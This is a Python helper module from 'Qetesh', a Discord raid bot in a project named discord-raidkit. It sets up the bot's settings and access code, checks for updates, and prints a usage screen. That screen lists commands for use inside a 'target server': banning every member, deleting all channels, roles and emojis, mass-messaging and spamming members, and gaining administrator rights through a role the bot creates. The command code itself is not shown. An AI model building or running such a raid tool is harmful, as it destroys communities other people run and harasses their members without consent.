# Scripted by Catterall (https://github.com/Catterall).
# Bot under the GNU General Public Liscense v2 (1991).


# Modules

import json
import os
import random as r
import re
import requests
from bs4 import BeautifulSoup
from colorama import Style, Back, Fore, init
init()
CODE = 0
DATA = {}


# Check for run_settings.json and generate a new file if not found.

def check_for_run_settings():
    global DATA
    try:
        with open('run_settings.json', 'r') as f:
            DATA = json.load(f)
            return DATA
    except FileNotFoundError:
        DATA = {}
        DATA["prefix"] = "q!"
        DATA["bot_token"] = "Replace this text with your bot token"
        with open('run_settings.json', 'w') as f:
            json.dump(DATA, f, indent=4)
            f.close()
        display_start_error("Generated run_settings.json - close this error window!")


# Check for code in temp.txt.
def check_for_temp_code():
    global CODE
    try:
        with open('cogs/temp.txt', 'r') as f:
            CODE = f.read().strip().replace(' ', '')
            f.close()
        return
    except FileNotFoundError:
        display_start_error("temp.txt not found - restart the bot.")


# Write a new temp file with a "CODE" used by the program.

def write_temp():
    global CODE
    if os.path.isfile('cogs/temp.txt'):
        os.remove('cogs/temp.txt')
    with open('cogs/temp.txt', 'w') as f:
        CODE = r.randint(1000, 9999)
        f.write(str(CODE))
        f.close()
    return


# Check for the servers.txt file and generate a new file if not found.

def check_for_servers():
    try:
        with open('cogs/servers.txt', 'r') as f:
            f.close()
    except FileNotFoundError:
        with open('cogs/servers.txt', 'w') as f:
            f.close()
    return


# Display an error screen if an error is encountered whilst starting the
# program.

def display_start_error(e):
    os.system('cls')
    print(Fore.RED + f'''


                                      ██████╗ ███████╗████████╗███████╗███████╗██╗  ██╗
                                     ██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██╔════╝██║  ██║
                                     ██║   ██║█████╗     ██║   █████╗  ███████╗███████║
                                     ██║▄▄ ██║██╔══╝     ██║   ██╔══╝  ╚════██║██╔══██║
                                     ╚██████╔╝███████╗   ██║   ███████╗███████║██║  ██║
                                      ╚══▀▀═╝ ╚══════╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝
                                    
                                    {Fore.RED}{e}

      {Fore.WHITE}Human. There has been an error attempting to run Qetesh. The following measures may solve the issue:



{Fore.GREEN}-{Fore.WHITE}The bot prefix specified may be invalid - a prefix must be provided in order to use the bot's commands.
{Fore.GREEN}-{Fore.WHITE}The bot token specified may be incorrect - try regenerating a new bot token and use that token instead.
{Fore.GREEN}-{Fore.WHITE}If the settings file is missing, try running the program again. If the issue persists, view the GitHub page.
{Fore.GREEN}-{Fore.WHITE}If the settings file is perfect, check whether you have enabled Privallged Gateway Intents on your bot's page.


{Style.DIM}{Fore.GREEN}If the issue persists after all the above measures are taken, you can create an issue here:
{Style.BRIGHT}{Back.RESET}{Fore.WHITE}https://github.com/Catterall/discord-raidkit/issues

{Fore.YELLOW}Thank you for using Qetesh and apologies for all errors encountered! -Catterall.{Fore.RESET}
'''.replace('█', f'{Fore.WHITE}█{Fore.RED}').replace('▀', f'{Fore.WHITE}▀{Fore.RED}').replace('▄', f'{Fore.WHITE}▄{Fore.RED}'))
    input()
    os.system('cls')
    os._exit(1)


# Display the title screen of the program.

def display_title_screen():
    os.system('cls')
    print(Fore.RED + f'''
                                      ██████╗ ███████╗████████╗███████╗███████╗██╗  ██╗
                                     ██╔═══██╗██╔════╝╚══██╔══╝██╔════╝██╔════╝██║  ██║
                                     ██║   ██║█████╗     ██║   █████╗  ███████╗███████║
                                     ██║▄▄ ██║██╔══╝     ██║   ██╔══╝  ╚════██║██╔══██║
                                     ╚██████╔╝███████╗   ██║   ███████╗███████║██║  ██║
                                      ╚══▀▀═╝ ╚══════╝   ╚═╝   ╚══════╝╚══════╝╚═╝  ╚═╝

{Fore.WHITE}{Back.BLUE}The following commands can be used in any text channel within the target server - permissions are not needed:
{Back.RESET}{Style.DIM}{Fore.RED}{DATA.get('prefix')}leave {CODE} <server>: Makes the bot leave a server.
{Style.BRIGHT}{Fore.LIGHTRED_EX}{DATA.get('prefix')}mass_leave {CODE}: Makes the bot leave every server.
{Style.DIM}{Fore.YELLOW}{DATA.get('prefix')}mass_nick {CODE} <nickname>: Change the nickname of all members on a server.
{Style.NORMAL}{Fore.GREEN}{DATA.get('prefix')}mass_dm {CODE} <message>: Message all of the members on a server with a custom message.
{Fore.BLUE}{DATA.get('prefix')}spam {CODE} <message>: Repeatedly spam all text channels on a server with a custom message.
{Style.DIM}{Fore.MAGENTA}{DATA.get('prefix')}cpurge {CODE}: Delete all channels on a server.
{Style.BRIGHT}{Fore.LIGHTMAGENTA_EX}{DATA.get('prefix')}admin {CODE} <role_name>: Gain administrator privileges on a server via an admin role created by the bot.
{Style.DIM}{Fore.RED}{DATA.get('prefix')}nuke {CODE}: Ban all members, then delete all roles, then delete all channels, then delete all emojis on a server.
{Style.BRIGHT}{Fore.LIGHTRED_EX}{DATA.get('prefix')}mass_nuke {CODE}: Nuke every server the bot is currently in.
{Style.DIM}{Fore.YELLOW}{DATA.get('prefix')}raid {CODE} <role_name> <nickname> <channel_name> <num_of_channels> <message>:
Delete all channels, then delete all roles, then give everyone a new role, then nickname everyone a new nickname,
then create x number of channels, then message everyone with a message, then spam all channels with a message.

{Style.DIM}{Fore.GREEN}Additional notes:
{Style.BRIGHT}{Back.RESET}{Fore.WHITE}Before running the nuke commands, make sure the role created by the bot upon its invite is above the roles of the
members you wish to ban (i.e. move the role as high as possible).

{Fore.LIGHTCYAN_EX}To refresh this window back to this page, use the command: {Fore.LIGHTGREEN_EX}{DATA.get('prefix')}refresh {CODE}

{Fore.LIGHTRED_EX}Qetesh created by Catterall (View for full guide): {Fore.WHITE}https://www.github.com/Catterall/discord-raidkit{Style.DIM}{Fore.RED}'''.replace('█', f'{Fore.WHITE}█{Fore.RED}').replace('▀', f'{Fore.WHITE}▀{Fore.RED}').replace('▄', f'{Fore.WHITE}▄{Fore.RED}'))
    return


# Used in the refresh command.

def refresh():
    check_for_run_settings()
    check_for_temp_code()
    display_title_screen()
    return


# Used to display errors in Qetesh commands.

def command_error(cmd):
    if cmd == "nuke":
        print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: {Fore.LIGHTRED_EX}{DATA.get('prefix')}nuke {CODE}{Fore.RED}.{Fore.RESET}")
    elif cmd == "mass_nuke":
        print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: {Fore.LIGHTRED_EX}{DATA.get('prefix')}mass_nuke {CODE}{Fore.RED}.{Fore.RESET}")
    elif cmd == "cpurge":
        print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: {Fore.LIGHTRED_EX}{DATA.get('prefix')}cpurge {CODE}{Fore.RED}.{Fore.RESET}")
    elif cmd == "mass_dm":
        print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: {Fore.LIGHTRED_EX}{DATA.get('prefix')}mass_dm {CODE} <message>{Fore.RED}.{Fore.RESET}")
    elif cmd == "spam":
        print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: {Fore.LIGHTRED_EX}{DATA.get('prefix')}spam {CODE} <message>{Fore.RED}.{Fore.RESET}")
    elif cmd == "mass_nick":
        print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: {Fore.LIGHTRED_EX}{DATA.get('prefix')}mass_nick {CODE} <nickname>{Fore.RED}.{Fore.RESET}")
    elif cmd == "leave":
        print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: {Fore.LIGHTRED_EX}{DATA.get('prefix')}leave {CODE} <server>{Fore.RED}.{Fore.RESET}")
    elif cmd == "mass_leave":
        print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: {Fore.LIGHTRED_EX}{DATA.get('prefix')}mass_leave {CODE}{Fore.RED}.{Fore.RESET}")
    elif cmd == "admin":
        print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: {Fore.LIGHTRED_EX}{DATA.get('prefix')}admin {CODE} <role_name>{Fore.RED}.{Fore.RESET}")
    elif cmd == "raid":
        print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: ({Fore.LIGHTRED_EX}{DATA.get('prefix')}raid {CODE} <role_name> <nick_name> <channel_name> <num_of_channels> <message>{Fore.RED}.{Fore.RESET}")
    elif cmd == "refresh":
        print(f"{Fore.RED}Incorrect command usage; the correct usage of the command is: {Fore.LIGHTRED_EX}{DATA.get('prefix')}refresh {CODE}{Fore.RED}.{Fore.RESET}")
    else:
        pass
    return


# Search the GitHub repository for the latest release.

def search_for_updates():
    THIS_VERSION = "1.5.5"

    header = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.75 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest"}
    url = f"https://github.com/Catterall/discord-raidkit/releases/latest"

    os.system('cls')
    print("Searching for updates.")
    r = requests.get(url, headers=header)
    os.system('cls')
    soup = str(BeautifulSoup(r.text, 'html.parser'))
    s1 = re.search('<title>', soup)
    s2 = re.search('·', soup)
    result_string = soup[s1.end():s2.start()]
    if THIS_VERSION not in result_string:
        s3 = re.search('originating_url":"', soup)
        s4 = re.search('","user_id":null', soup)
        update_link = soup[s3.end():s4.start()]
        print(Style.BRIGHT + Fore.LIGHTYELLOW_EX + f'''



                   ███╗   ██╗███████╗██╗    ██╗    ██╗   ██╗██████╗ ██████╗  █████╗ ████████╗███████╗██╗
                   ████╗  ██║██╔════╝██║    ██║    ██║   ██║██╔══██╗██╔══██╗██╔══██╗╚══██╔══╝██╔════╝██║
                   ██╔██╗ ██║█████╗  ██║ █╗ ██║    ██║   ██║██████╔╝██║  ██║███████║   ██║   █████╗  ██║
                   ██║╚██╗██║██╔══╝  ██║███╗██║    ██║   ██║██╔═══╝ ██║  ██║██╔══██║   ██║   ██╔══╝  ╚═╝
                   ██║ ╚████║███████╗╚███╔███╔╝    ╚██████╔╝██║     ██████╔╝██║  ██║   ██║   ███████╗██╗
                   ╚═╝  ╚═══╝╚══════╝ ╚══╝╚══╝      ╚═════╝ ╚═╝     ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝


              {Fore.LIGHTRED_EX}Human. There has been a brand new update to the discord raidkit. You can find the update here:

                              {Fore.LIGHTBLUE_EX}{update_link}

                                              {Fore.WHITE}(Enter anything to continue) '''.replace('█', f'{Fore.YELLOW}█{Fore.LIGHTGREEN_EX}'), end=f"\n\n{' '*59}")
        input()
        return


# Scripted by Catterall (https://github.com/Catterall).
# Bot under the GNU General Public Liscense v2 (1991).
